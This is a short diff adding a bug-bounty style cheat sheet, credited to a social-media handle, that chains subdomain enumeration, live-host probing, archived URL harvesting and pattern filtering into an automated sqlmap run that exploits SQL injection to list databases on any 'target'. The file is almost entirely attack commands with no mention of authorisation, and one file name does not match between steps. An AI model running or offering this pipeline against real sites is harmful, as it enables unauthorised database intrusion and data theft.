@@ -1,0 +1,12 @@
+Methods To Find Sqli💉💉
+@PadsalaTushal
+
+
+Command Line Tools Like a Pro
+1. sublist3r -d target | tee -a domains 
+2. cat domains | httpx | tee -a alive
+3. cat alive | waybackurls | tee -a urls
+4. gf sqli urls >> sqli
+5. sqlmap -m sqli.txt --dbs --batch
+
+
